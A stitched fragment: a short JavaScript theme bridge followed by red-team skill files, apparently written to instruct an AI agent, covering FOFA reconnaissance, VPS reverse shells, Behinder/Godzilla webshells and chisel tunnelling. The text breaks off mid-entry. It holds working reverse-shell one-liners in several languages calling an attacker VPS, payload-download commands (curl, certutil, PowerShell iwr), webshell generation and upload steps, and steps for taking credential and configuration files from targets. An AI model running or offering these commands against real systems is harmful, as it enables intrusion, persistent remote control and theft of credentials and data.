// 主题走 URL 参数：?theme=dark|light，默认 dark。
;(() => {
  const q = new URLSearchParams(location.hash.slice(1) || location.search.slice(1))
  const dark = (q.get('theme') || 'dark') !== 'light'
  const tokens = dark
    ? {
        bg: '#15171c', fg: '#e6e7ea', muted: '#8d93a0', card: '#1c1f26', line: '#2c313b',
        accent: '#7c8cff', 'accent-soft': '#232844', code: '#a9b1c6',
        font: '-apple-system, "Segoe UI", "Noto Sans SC", system-ui, sans-serif',
      }
    : {
        bg: '#fbfbf9', fg: '#1c1d21', muted: '#6b7280', card: '#ffffff', line: '#e3e3e6',
        accent: '#3563e9', 'accent-soft': '#e6edfd', code: '#4b5162',
        font: '-apple-system, "Segoe UI", "Noto Sans SC", system-ui, sans-serif',
      }

  const root = document.documentElement
  root.dataset.theme = dark ? 'dark' : 'light'
  root.style.colorScheme = dark ? 'dark' : 'light'
  for (const [k, v] of Object.entries(tokens)) root.style.setProperty('--magpie-' + k, v)

  // 预览里 options 只活在内存：刷新页面就回到默认值。
  // 第一次 get 时用演示快照的 options 打底——bridge 先于 catalog.js 加载，所以只能惰性取。
  const store = {
    mode: '',
    persona: '',
    agents: [],
    enabled: {},
    pinned: {},
    imports: [],
    refreshAt: 0,
    inline: [],
  }
  let seeded = false

  const api = {
    theme: { dark, lang: 'zh-CN', tokens },
    context: {},
    service: '',
    visible: true,
    ready: Promise.resolve({ dark, lang: 'zh-CN', tokens }),
    onTheme() {},
    onVisibility(fn) {
      api._vis = fn
    },
    onAction() {},
    options: {
      async get() {
        if (!seeded) {
          seeded = true
          const snapshot = window.PURGE_CATALOG?.options
          if (snapshot && typeof snapshot === 'object') Object.assign(store, snapshot)
        }
        return JSON.parse(JSON.stringify(store))
      },
      async set(next) {
        seeded = true
        Object.assign(store, JSON.parse(JSON.stringify(next || {})))
        return JSON.parse(JSON.stringify(store))
      },
    },
    read: async () => ({}),
  }
  window.magpie = api
})()
</script>

    "text": "# FOFA 资产测绘（限速安全版）\n\n## 凭据\n- API Key：从环境变量 `FOFA_KEY` 读取（**任何 key 都不要写进仓库**；本技能所有脚本只读环境变量）\n- 接口：`GET https://fofa.info/api/v1/search/all`\n- 参数：`key`、`qbase64`（查询语句的 base64）、`size`、`page`、`fields`\n\n## 官方限额（fofa.info/vip，2026-09 核对）\n\n| 会员 | 查询请求 | 获取数据量 | **查询接口并发** |\n|---|---|---|---|\n| 注册用户（免费） | 无 API（页面 300 次/月） | 页面 3,000 条/月 | — |\n| 个人版 | 10,000 次/月 | 100,000 条/月 | **1 秒 1 次** |\n| 专业版 | 80,000 次/月 | 800,000 条/月 | **1 秒 1 次** |\n| 商业版 | 900,000 次/月 | 9,000,000 条/月 | **1 秒 2 次** |\n| 企业版 V2 | 5,000,000 次/月 | 50,000,000 条/月 | **1 秒 5 次** |\n\n## 实测行为（实测验证）\n- 连续快速请求 → **HTTP 429**，响应体 `{\"error\":true,\"errmsg\":\"[45012] 请求速度过快\"}`\n- key 错误 → HTTP 200 + `{\"error\":true,\"errmsg\":\"[-700] 账号无效\"}`\n- 单页 `size` 到 1000 正常；请求间隔 ≥1 秒时连续请求均返回 200\n- 结论：**按 1 请求/秒 保守执行，绝不并发**；遇到 45012 必须退避，不要立即重试\n\n## 使用纪律（重要）\n1. **精确查询优先**：`domain=` / `cert=` / `org=` 先缩小范围，再考虑 `body=` / `title=` 等宽泛语句。宽语句返回几十万条没意义，还烧配额。\n2. **不要全量翻页**：默认只取前 1–3 页（每页 100 条）拿到测绘入口即可。\n3. **单进程单线程**：同一时刻只跑一个采集任务；多个查询串行排队。\n4. **结果落盘缓存**：同一查询不要重复拉，先看 `runs/fofa-*.jsonl` 是否已有。\n5. **长任务放后台**：用 `run_in_background` 跑，别阻塞对话。\n6. 配额耗尽或被限速时改用其他数据源（证书透明、DNS、搜索引擎），不要死磕。\n\n## 限速客户端（用这个，不要手写 curl 循环）\n```bash\ncat > runs/fofa_client.py <<'PY'\n#!/usr/bin/env python3\n\"\"\"FOFA 采集（限速安全）：单线程 + 最小间隔 + 指数退避 + 结果缓存。\n\n用法:\n  python3 runs/fofa_client.py 'domain=\"example.com\"' --pages 2 --size 100 --interval 2.0\n输出:\n  runs/fofa-<slug>.jsonl   每行一个资产 {host,ip,port,title,domain,server,protocol}\n\"\"\"\nimport argparse, base64, hashlib, json, os, sys, time, urllib.error, urllib.parse, urllib.request\n\nKEY = os.environ[\"FOFA_KEY\"]\nAPI = \"https://fofa.info/api/v1/search/all\"\nFIELDS = \"host,ip,port,title,domain,server,protocol\"\nRETRY_BACKOFF = [5, 15, 45]          # 遇 45012 的退避秒数\nHARD_BUDGET = 30                      # 单次运行最多请求次数\n\n\ndef fetch(query, page, size, timeout=30):\n    qs = urllib.parse.urlencode({\n        \"key\": KEY, \"qbase64\": base64.b64encode(query.encode()).decode(),\n        \"size\": size, \"page\": page, \"fields\": FIELDS,\n    })\n    req = urllib.request.Request(API + \"?\" + qs, headers={\"User-Agent\": \"redteam-recon/1.0\"})\n    try:\n        with urllib.request.urlopen(req, timeout=timeout) as r:\n            return r.status, json.load(r)\n    except urllib.error.HTTPError as e:\n        body = e.read().decode(\"utf-8\", \"ignore\")\n        try:\n            return e.code, json.loads(body)\n        except Exception:\n            return e.code, {\"error\": True, \"errmsg\": body[:200]}\n\n\ndef main():\n    ap = argparse.ArgumentParser()\n    ap.add_argument(\"query\")\n    ap.add_argument(\"--pages\", type=int, default=2, help=\"最多翻页数（默认 2）\")\n    ap.add_argument(\"--size\", type=int, default=100, help=\"每页条数（默认 100，不要调大）\")\n    ap.add_argument(\"--interval\", type=float, default=2.0, help=\"请求最小间隔秒（默认 2.0）\")\n    ap.add_argument(\"--out\", default=None)\n    args = ap.parse_args()\n\n    slug = hashlib.md5(args.query.encode()).hexdigest()[:8]\n    out = args.out or f\"runs/fofa-{slug}.jsonl\"\n    os.makedirs(os.path.dirname(out) or \".\", exist_ok=True)\n\n    if os.path.exists(out) and os.path.getsize(out) > 0:\n        print(f\"[cache] {out} 已存在（{os.path.getsize(out)} bytes），如需重拉请先删除\", file=sys.stderr)\n        return 0\n\n    seen, rows, requests_made, last_ts = set(), [], 0, 0.0\n    for page in range(1, args.pages + 1):\n        # ---- 限速：保证两次请求之间至少间隔 interval 秒 ----\n        wait = args.interval - (time.time() - last_ts)\n        if wait > 0:\n            time.sleep(wait)\n\n        status, data = None, None\n        for attempt, backoff in enumerate([0] + RETRY_BACKOFF):\n            if attempt:\n                print(f\"[backoff] 等待 {backoff}s 后重试 (page={page})\", file=sys.stderr)\n                time.sleep(backoff)\n            last_ts = time.time()\n            requests_made += 1\n            if requests_made > HARD_BUDGET:\n                print(f\"[stop] 达到请求预算 {HARD_BUDGET}\", file=sys.stderr)\n                break\n            status, data = fetch(args.query, page, args.size)\n            if status == 200 and not data.get(\"error\"):\n                break\n            errmsg = str(data.get(\"errmsg\", \"\"))\n            if \"45012\" in errmsg or status == 429:\n                continue                      # 限速 → 退避重试\n            print(f\"[stop] 不可重试错误 http={status} {errmsg}\", file=sys.stderr)\n            data = None\n            break\n        if data is None:\n            break\n\n        results = data.get(\"results\") or []\n        print(f\"[page {page}] {len(results)} 条 (size={data.get('size')}, 消耗F点={data.get('consumed_fpoint')})\", file=sys.stderr)\n        for item in results:\n            if isinstance(item, str):\n                item = [item]\n            host = item[0] if len(item) > 0 else \"\"\n            ip = item[1] if len(item) > 1 else \"\"\n            port = item[2] if len(item) > 2 else \"\"\n            key = (host, ip, port)\n            if key in seen:\n                continue\n            seen.add(key)\n            rows.append({\n                \"host\": host, \"ip\": ip, \"port\": port,\n                \"title\": item[3] if len(item) > 3 else \"\",\n                \"domain\": item[4] if len(item) > 4 else \"\",\n                \"server\": item[5] if len(item) > 5 else \"\",\n                \"protocol\": item[6] if len(item) > 6 else \"\",\n            })\n        if len(results) < args.size:\n            break                              # 已到末页\n\n    with open(out, \"w\", encoding=\"utf-8\") as f:\n        for row in rows:\n            f.write(json.dumps(row, ensure_ascii=False) + \"\\n\")\n    print(f\"[done] {len(rows)} 条资产 → {out}（共 {requests_made} 次请求）\", file=sys.stderr)\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\nPY\n```\n\n### 用法\n```bash\nmkdir -p runs\npython3 runs/fofa_client.py 'domain=\"example.com\"' --pages 2 --size 100 --interval 2.0\npython3 runs/fofa_client.py 'cert=\"example.com\"' --pages 3 --interval 2.0\npython3 runs/fofa_client.py 'org=\"示例科技有限公司\"' --pages 2 --interval 2.0\n```\n\n### 落库\n读 `runs/fofa-*.jsonl`，逐条 `redteam_asset_add`：`provenance=\"passive\"`、`tool=\"fofa\"`，端口带 `url=host`、`title`、`product=server`；域名写进 `names`。\n\n## 常用查询语句\n| 目的 | 语句 |\n|---|---|\n| 某域名全部资产 | `domain=\"example.com\"` |\n| 证书包含该域名 | `cert=\"example.com\"` |\n| 某 C 段 | `ip=\"203.0.113.0/24\"` |\n| 单位名称 | `org=\"示例科技有限公司\"` |\n| 按标题找后台 | `title=\"登录\" && domain=\"example.com\"` |\n| 按 body 特征 | `body=\"/seeyon/\"` |\n| 指定端口 | `ip=\"203.0.113.0/24\" && port=\"3306\"` |\n\n> 宽泛语句（单独用 `body=` / `title=`）结果量大、消耗配额快，务必叠加域名或 IP 限定。"
  },

    "text": "# VPS 中转与反弹 Shell（<你的VPS_IP>）\n\n自建公网 VPS 作为**反弹 Shell 落地端 + 载荷投递点 + 内网中转跳板**。目标只需要能访问互联网，\n把 shell 弹到 VPS 的 9000-9999 端口；智能体通过 tmux 会话**非交互地**下发命令并读回输出。\n\n## 何时用 / 何时不用\n\n| 场景 | 选择 |\n| --- | --- |\n| 目标能直连本机（同网段、有公网 IP） | 直接本机监听，**不必**用 VPS |\n| 目标只能出网、本机在内网（NAT 后） | ✅ 用 VPS，这是主场景 |\n| 目标是云主机/容器，出网受限但能出 80/443 | ✅ 用 VPS 的 9000-9999（若被限制就用 443/80 类端口，见排障） |\n| 只需要跑一条命令拿结果 | 优先用 Web 漏洞/RCE 的 HTTP 通道，比反弹 shell 更稳更隐蔽 |\n\n## 资产与凭据\n\n```\n主机    : <你的VPS_IP>（腾讯云，Ubuntu 24.04，2C2G，主机名 <VPS 主机名>）\n用户    : ubuntu（sudo 免密）\n私钥    : ~/.dsh/redteam/toolkit/vps/id_rsa          ← 权限 600，不要复制进仓库/聊天\n可用端口: 9000-9999                                   ← 云安全组只放了这一段\n工具脚本: ~/.dsh/redteam/toolkit/vps/vps.sh\n```\n\n**密钥纪律**：私钥只在上面这个路径。任何情况下不要把私钥内容写进技能文件、报告、仓库或对话。\n\n已长期占用的端口：**9001 / 9007 / 9009（还有其他 9008 等临时服务）**，另有 tmux 会话 `cap / sh / up / www`。\n**这些不是本次演练的，不要 kill、不要覆盖。**\n\n## 快速开始\n\n```bash\nVPS=~/.dsh/redteam/toolkit/vps/vps.sh\n\n$VPS status                 # 看 VPS 状态、剩余端口、现有会话\n$VPS listen                 # 自动挑一个空闲端口开监听（也可 $VPS listen 9000）\n# → 拿到端口后，用目标上的漏洞执行反弹命令（见下一节）\n$VPS send 9000 'id; uname -a'      # 目标回连后，下发命令\n$VPS read 9000 60                  # 读回输出\n$VPS kill 9000                     # 用完必须清理\n```\n\n`listen` 用 tmux + rlwrap + **自动重听循环**：连接断了会自动重新监听，适合反复触发。\n\n## 工具用法（vps.sh）\n\n| 子命令 | 作用 |\n| --- | --- |\n| `status` | VPS 身份、系统、工具就绪情况、9000-9999 占用、tmux 会话 |\n| `port` | 自动返回一个 9000-9999 内的空闲端口 |\n| `listen [port]` | 开持久监听（省略端口则自动选），打印目标侧命令模板 |\n| `sessions` | 列出 VPS 上的 tmux 会话 |\n| `send <port> '<cmd>'` | **把命令下发进已上线的反弹 Shell**（智能体主用） |\n| `read <port> [行数]` | 读回该会话最近输出（默认 200 行） |\n| `watch <port>` | 持续刷新输出（人看） |\n| `attach <port>` | 本机 tmux 接管会话（人用，`Ctrl-B D` 退出） |\n| `kill <port>` | 关闭监听 + 清理会话 + 释放端口 |\n| `serve [port] [dir]` | VPS 上起 HTTP 服务，供目标下载载荷（默认 9008） |\n| `push <本地> [远端]` | 上传文件到 VPS |\n| `get <远端> [本地]` | 从 VPS 取回文件（把目标产物拉回来） |\n| `sh '<命令>'` | 在 VPS 上直通执行任意命令 |\n\n环境变量可覆盖：`VPS_HOST`、`VPS_KEY`。\n\n## 目标侧反弹 payload（端口换成你 listen 的那个）\n\n```bash\n# Bash（最常用）\nbash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'\nbash -c 'exec bash -i &>/dev/tcp/<你的VPS_IP>/9000 <&1'\n\n# nc 系（有 -e 的版本）\nnc <你的VPS_IP> 9000 -e /bin/bash\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <你的VPS_IP> 9000 > /tmp/f\n\n# Python（无 nc 时的兜底，兼容 python2/3）\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<你的VPS_IP>\",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# PHP（Web 侧 getshell 后常用）\nphp -r '$s=fsockopen(\"<你的VPS_IP>\",9000);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n\n# Perl\nperl -e 'use Socket;$i=\"<你的VPS_IP>\";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\n\n# Windows PowerShell\npowershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('<你的VPS_IP>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"\n```\n\n**URL 编码**：走 Web 漏洞（命令注入/RCE）时把 payload 整体 URL 编码后再传参，避免 `&`、`>` 被截断。\n\n## 会话升级与稳定化\n\n裸 `nc` 出来的 shell 没有 TTY：不能 `sudo`、不能 `su`、`vi` 和 `top` 会异常。升级：\n\n```bash\n# 目标上执行（python3 必装率最高）\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# 或\nscript -qc /bin/bash /dev/null\n```\n\n```bash\n# 本机侧（attach 后）让 Ctrl-C/方向键正常\n# 在反弹 shell 里依次：Ctrl-Z\nstty raw -echo; fg\n# 回车两次，然后\nexport TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160\n```\n\n**更稳的方案：socat 全 TTY 监听**（VPS 上已装 socat）：\n\n```bash\n$VPS sh \"tmux new-session -d -s rt-pty -t '' 'socat file:\\`tty\\`,raw,echo=0 tcp-listen:9000,reuseaddr'\"\n# 目标侧\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<你的VPS_IP>:9000\n```\n\n掉线自动重连（目标侧循环）：\n\n```bash\nwhile true; do bash -c 'bash -i >& /dev/tcp/<你的VPS_IP>/9000 0>&1'; sleep 10; done &\n```\n\n## 载荷投递（VPS 当文件中转）\n\n```bash\n$VPS serve 9100 ~/rt/payloads        # VPS 上起 HTTP 服务\n$VPS push ./suo5 /home/ubuntu/rt/payloads/\n# 目标侧（Linux）\ncurl -O http://<你的VPS_IP>:9100/suo5  或  wget http://<你的VPS_IP>:9100/suo5\n# 目标侧（Windows）\ncertutil -urlcache -split -f http://<你的VPS_IP>:9100/beacon.exe C:\\Windows\\Temp\\a.exe\npowershell -c \"iwr http://<你的VPS_IP>:9100/beacon.exe -OutFile C:\\Windows\\Temp\\a.exe\"\n```\n\n**取回战利品**：`$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<靶标>/runs/`\n\n## 反向隧道与中转\n\n目标在内网、本机不可达时，用 VPS 当跳板：\n\n```bash\n# 反向隧道：VPS:9200 → 目标内网 10.0.0.5:8080（在目标上执行）\nssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <目标上的密钥> ubuntu@<你的VPS_IP>\n# 之后本机经 VPS 访问：ssh -L 8080:127.0.0.1:9200 ubuntu@<你的VPS_IP>\n\n# socat 端口转发（VPS 上）\n$VPS sh \"tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'\"\n```\n\nWebShell 场景配合技能 `suo5-tunnel`：把 suo5 客户端放本机，服务端传到目标，隧道出口经 VPS 更稳。\n\n## 纪律（务必遵守）\n\n1. **端口纪律**：只用 9000-9999，开监听前先 `$VPS port` 或 `$VPS status` 确认空闲；**绝不占用/杀掉 9001、9007、9009 与 `cap/sh/up/www` 会话**。\n2. **每次用完必须 `$VPS kill <port>`**，不要留下裸监听（既是资源占用也是痕迹）。\n3. **凭据落库、不留 VPS**：目标上抓到的口令/哈希用 `redteam_credential_add` 写进本机资产库（明文 `secret_value`），产物落本机 `runs/`；**不要把凭据写进 VPS 家目录**。\n4. **VPS IP 对目标可见**：它属于本次演练的基础设施，不要在目标上留下包含它之外的额外个人信息。\n5. **落库**：每次成功拿到 shell 用 `redteam_access_add` 记录（host/账号/方式/权限/会话引用），每条凭据用 `redteam_credential_add` 记录，攻击脚本用 `redteam_attack_file_add` 归档。\n6. **`send` 出去的每条命令都要能从 `read` 的输出里拿到证据**，重要输出先重定向到文件再 `get` 回来，避免 tmux 回滚缓冲被刷掉。\n\n## 排障\n\n| 现象 | 处理 |\n| --- | --- |\n| 目标回连不上 | 先确认监听真在：`$VPS sessions` + `$VPS sh \"ss -ltnp \\| grep <port>\"`；再确认目标出网（目标上 `curl -s http://<你的VPS_IP>:<port>` 若返回连接成功说明端口可达） |\n| 端口在范围外/换端口 | 云安全组只放了 9000-9999，超范围必失败 |\n| 反复掉线 | 目标侧加 `while true` 重连循环；或用 socat 全 TTY 方案 |\n| 有回显但命令不执行 | payload 被 URL 截断（`&`/`>`），整体 URL 编码 |\n| 中文乱码 | 目标上 `export LANG=C.UTF-8`，或先 `read` 前把 tmux 设置 `tmux set -t rt-<port> utf8 on` |\n| 无 TTY、`sudo` 报错 | 升级 PTY（见上） |\n| 本机探测端口\"全部可连\" | 本机网关会对任意端口回 SYN-ACK，**本机 `nc -z` 不能判断 VPS 端口可达性**；要用外部节点或目标本身验证 |\n\n## 与其他技能的关系\n\n- `suo5-tunnel`：WebShell → SOCKS5 隧道，出口可以走本 VPS\n- `webshell-toolkit`：冰蝎/哥斯拉/蚁剑，拿到 WebShell 后的管理\n- `cn-proxy-pool`：需要国内出口 IP 时叠加代理（不要改动本机网络配置）\n- `active-scan` / `fofa-recon`：内网可达后继续测绘"
  },

    "text": "# WebShell 工具包（已就位）\n\n目录 `$DSH_HOME/redteam/toolkit/`，Java 25 已安装。\n\n## 铁律：落地必须是冰蝎马 / 哥斯拉马（加密马）\n\n**用户要在控制台用冰蝎/哥斯拉客户端直连使用这个入口**，所以：\n- **默认只落地冰蝎马（Behinder）或哥斯拉马（Godzilla）的加密马**，并把 `shell_type` + `pass_key` 落库（`redteam_webshell_add`）。\n- **一句话马（`?cmd=`）/ 自研马 / 内存马不算交付**：用户连不上、无法交互操作。只能作为**临时中转**（例如只为投递真正的马或建隧道），且必须在 note 里写明\"临时中转，非交付入口\"。\n- 哥斯拉 GUI 生成需要人在场；**优先用下面「无 GUI 生成冰蝎马」的方式**，一条命令就能产出可交付的马。\n\n## 无 GUI 生成冰蝎马（推荐，可脚本化）\n\n冰蝎马只是把密钥写进模板：密钥 = `md5(连接密码)[:16]`。仓库自带模板：\n`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`\n\n```bash\nTK=$DSH_HOME/redteam/toolkit\nPASS='Rt@2026#xz'                       # 连接密码（随机生成，别用 rebeyond）\nKEY=$(printf '%s' \"$PASS\" | md5sum | cut -c1-16)   # 冰蝎要求 32 位 md5 的前 16 位\n# JSP：替换模板里的密钥\nsed \"s/e45e329feb5d925b/$KEY/\" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp\n# PHP：同理（模板变量名 $key）\nsed \"s/e45e329feb5d925b/$KEY/\" $TK/Behinder/server/shell.php > /tmp/rt-shell.php\necho \"连接密码 $PASS ｜ 密钥 $KEY\"      # 两者都要写进 runs/ 与 redteam_webshell_add\n```\n\n- 默认密钥 `e45e329feb5d925b` = `md5(\"rebeyond\")[:16]`（模板里的注释就是这个意思）——**必须换成自己的密码**，用默认密码等于把马送给防守方。\n- 目标有 WAF/查杀时用 unicode 转义变体 `shell_uni.jsp`：密钥也是转义形式，需按 `\\\\u00xx` 逐字符替换（可用 python 生成）。\n- 已实测：`shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` 七个模板都能用上面这条 `sed` 一条命令换好密钥。\n\n哥斯拉马（需要 GUI 时）：\n```bash\nDISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar\n# 管理 → 生成：载荷 java/jsp、加密器 Java_AES_BASE64、密码与密钥随机 → 生成后上传\n```\n\n## 上传后必须验证\"用户能连上\"\n1. `curl -s -o /dev/null -w '%{http_code}' \"https://target/upload/x.jsp\"` → 预期 200（**不要用 GET 带 cmd 参数去测**，冰蝎/哥斯拉马不响应明文命令）。\n2. 用冰蝎或哥斯拉 GUI 新建连接（URL + 连接密码）点「测试连接」→ 通了才算成功；通了再用虚拟终端执行 `id/whoami`。\n3. 落库必须写全：`url`、`shell_type=behinder|godzilla`、`pass_key=连接密码`、`privilege`、`secret_ref`（证据文件）；随后**立刻建 suo5 隧道**（技能 `suo5-tunnel`）。\n\n## 工具一览\n\n| 工具 | 启动命令 | 说明 |\n|---|---|---|\n| 冰蝎 Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 加密流量，JSP/PHP/ASPX |\n| 哥斯拉 Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | 支持 JSP/PHP/ASPX 全加密 payload |\n| 中国蚁剑 AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 首次启动选择源码目录 `antSword-2.1.16` |\n| suo5 隧道 | `./suo5-linux-amd64` | 见技能 `suo5-tunnel` |\n\n## 典型流程（授权演练）\n1. **确定写入点**：上传漏洞 / 任意文件写 / 后台插件上传 / 模板写入 / 数据库写文件（`INTO OUTFILE`）。\n2. **生成 payload**：按目标语言选 JSP/JSPX/PHP/ASPX（见上「无 GUI 生成冰蝎马」），密码随机生成并记到 `runs/`。\n3. **上传并访问**：`curl -s \"https://target.example.com/upload/x.jsp\"` 确认返回 200；不要把 shell 放在显眼路径（如 `/shell.jsp`），用与静态资源同风格的随机文件名。\n4. **连接管理**：在工具里新增 URL + 密码，测试连接；成功后用「虚拟终端」执行命令。\n5. **维持与利用**：\n   - 收集 `id/whoami/hostname/uname -a`、系统账号、内网 IP、路由。\n   - **立刻用 suo5 起隧道进内网**（技能 `suo5-tunnel`，这是内网突破的标准通道）。\n   - 抓取敏感文件：`/etc/passwd`、配置、`.env`、源码、数据库连接串 → 存 `runs/`。\n6. **落库**：\n   - `redteam_webshell_add`（url / **shell_type** / **pass_key** / privilege / secret_ref）\n   - `redteam_access_add`（host/账号/方式 webshell/权限/会话引用）\n   - `redteam_vuln_update` 把入口漏洞置为 `exploited`\n   - `redteam_http_evidence_add` 保存上传请求与 shell 访问请求\n   - `redteam_chain_add`（stage=exploit/access）\n\n## 命令执行（临时中转时才用）\n如果只需要一次性命令执行，优先直接用已有 RCE 或隧道，不必落一句话马：\n```bash\n# 例：通过临时一句话马传参执行（用后即删，不算交付入口）\ncurl -s \"https://target.example.com/upload/x.jsp?cmd=id\"\n# 冰蝎/哥斯拉是 GUI 工具，命令行下用 suo5 隧道 + 常规工具更省事\n```\n\n## 注意事项\n- 生成的 shell 只能上传到**本次授权演练的目标**；用完按需清理（删除文件、恢复原状）。\n- 工具 GUI 需要图形会话（`DISPLAY=:10.0` 可用）。\n- 凭据用 `redteam_credential_add` 落库：**明文写 `secret_value`**（面板直接显示，便于复用），同时把证据文件写 `runs/` 并在 `secret_ref` 里引用。资产库只在本机，别把库或导出内容带走。\n- 目标可能有 EDR/查杀：先测试 shell 是否存活，避免反复落地触发告警；落地失败就换语言/编码（JSP→JSPX→PHP）或换上传点。"

    "chars": 3728,
    "injectable": true,
    "builtin": true,
    "text": "# chisel（HTTP 隧道 / 端口转发）\n\n> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，\n> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：\n> ```bash\n> set -a; . \"$DSH_HOME/.env\" 2>/dev/null || . \"$HOME/.dsh/.env\"; set +a\n> VPS_USER=\"${REDTEAM_VPS_USER:-ubuntu}\"; VPS=\"$REDTEAM_VPS_HOST\"\n> ```\n> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。\n\n`chisel` 把 TCP 流量封进 **HTTP/WebSocket**，因此**最容易穿过只放行 80/443 的出网策略与反向代理**。\n它和 suo5 的分工：\n\n| | suo5 | chisel |\n| --- | --- | --- |\n| 入口前提 | **必须有 WebShell**（HTTP 通道） | **只要有命令执行**（能跑二进制即可） |\n| 传输 | HTTP 长连接（伪装成正常请求） | HTTP/WebSocket（upgrade） |\n| 强项 | 从 Web 入口进内网，用户可复用 | 从 shell/RCE 入口进内网；端口转发灵活 |\n| 噪声 | 低（像普通 Web 请求） | 低-中（WebSocket 特征明显些） |\n\n**选择口径**：有 WebShell → 优先 `suo5-tunnel`；只有命令执行/RCE 或需要精确端口转发 → 用 chisel。\n\n## 本机二进制\n\n| 文件 | 路径 |\n| --- | --- |\n| chisel（Linux amd64，服务端与客户端同一个二进制） | `$DSH_HOME/redteam/toolkit/chisel/chisel`（v1.12.0） |\n\n已同步到 VPS 载荷目录：`http://$REDTEAM_VPS_HOST:9100/`（目标可 `curl` 直接拉）。\n\n## 一、反向 SOCKS（最常用：目标主动连我们）\n\n```bash\n# 1) 我方 VPS 起服务端（tmux 里跑，别让 SSH 断开杀掉）\ntmux new -s chisel\n$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5\n#    --reverse  允许客户端注册反向隧道\n#    --socks5   开启内置 SOCKS5（客户端连上后该端口即可用）\n#    可选加固：--auth user:pass   加认证，避免被扫到白用\n#    可选伪装：--backend http://127.0.0.1:80  把 Web 流量转发到本地站点\n\n# 2) 目标侧起客户端（通过已有的 RCE/命令执行点跑；先把二进制拉上去）\ncurl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c\n/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks\n#    R:socks = 反向 SOCKS；连上后 VPS 的 1080 端口即为内网 SOCKS5 入口\n\n# 3) 本机通过 VPS 的 SOCKS 访问内网\nproxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/\n#    runs/proxychains-1080.conf 里写：socks5 $REDTEAM_VPS_HOST 1080\n#    ⛔ 不要改系统 /etc/proxychains4.conf，用 -f 指向 runs/ 下的临时配置\n```\n\n## 二、反向端口转发（把内网某个端口映射出来）\n\n```bash\n# 目标侧：把内网 10.0.0.5:3389 映射到 VPS 的 13389\n/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389\n# 本机：直接连 VPS:13389 即为内网 3389\nrdesktop $REDTEAM_VPS_HOST:13389\n```\n\n## 三、正向 SOCKS（目标能直连我们、但我们要主动连目标内网）\n\n```bash\n# 目标侧起服务端\n/tmp/c server -p 9443 --socks5\n# 我方起客户端做本地转发\nchisel client <target>:9443 1080:socks\n# 之后 proxychains 指向 127.0.0.1:1080\n```\n\n## 四、多级 / 联动\n\n```bash\n# 已有 A 隧道（suo5 → 127.0.0.1:1080），要通过 A 在内网主机 B 上再起 chisel\nproxychains4 -f runs/proxychains-1080.conf \\\n  ssh user@10.0.0.6 \"curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &\"\n# 逐层扩大可达范围，每层都要登记隧道与可达网段\n```\n\n## 五、纪律与自保\n\n1. **必须跑在 tmux / nohup 里**：会话断开隧道就没了（`nohup ... &` 或 `tmux`）。\n2. **服务端加认证**：公网 VPS 上的 chisel 服务端会被扫端口，加 `--auth user:pass`，用完 `pkill` 关掉。\n3. **端口选择**：别用 80/443（可能被 VPS 上别的服务占用），用 9443/8443 等高位端口；\n   **VPS 安全组要放行**。\n4. **目标侧落地要清理痕迹与文件**：`/tmp/c` 用完可删；注意别把二进制放在有明显特征的路径。\n5. **不要用自建 VPS 上的代理冒充\"突破\"**：隧道登记 `entry_kind` 必须说清目标侧那一端（见下）。\n\n## 六、输出与落库（强制）\n\n1. **隧道登记 `redteam_tunnel_add`**，字段必须写全：\n   - `kind`：`chisel`；\n   - `listen`：**用户实际能用的监听地址**（如 `$REDTEAM_VPS_HOST:1080` 或 `127.0.0.1:1080`）；\n   - `entry`：目标侧的入口（如 `10.0.0.6 上的 /tmp/c 客户端 → VPS:9443`）；\n   - `reach`：**可达网段**（如 